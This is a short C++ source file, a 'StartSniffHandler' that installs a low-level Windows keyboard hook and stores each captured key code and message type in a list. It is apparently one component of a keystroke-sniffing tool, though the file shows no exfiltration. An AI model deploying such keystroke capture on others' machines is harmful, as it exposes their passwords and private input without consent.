#include "StartSniffHandler.hpp"

#include "Processes/ActiveWindowsHook.hpp"
#include "Processes/WindowsHook.hpp"

void StartSniffHandler::run()
{
	ActiveWindowsHook::register_hook(
		WindowsHook::Type::KEYBOARD,
		[this](const int action_type, const WPARAM message_type, const LPARAM message_data)
		{
			callback(action_type, message_type, message_data);
		}
	);
}

void StartSniffHandler::callback(const int action_type, WPARAM message_type, const LPARAM message_data)
{
	static constexpr int KEYBOARD_ACTION = 0;
	if (action_type != KEYBOARD_ACTION)
	{
		return;
	}

	const auto data = reinterpret_cast<const KBDLLHOOKSTRUCT*>(message_data);

	const uint32_t key_code = data->vkCode;

	m_keys.push_back(KeyboardEvent{key_code, message_type});
}
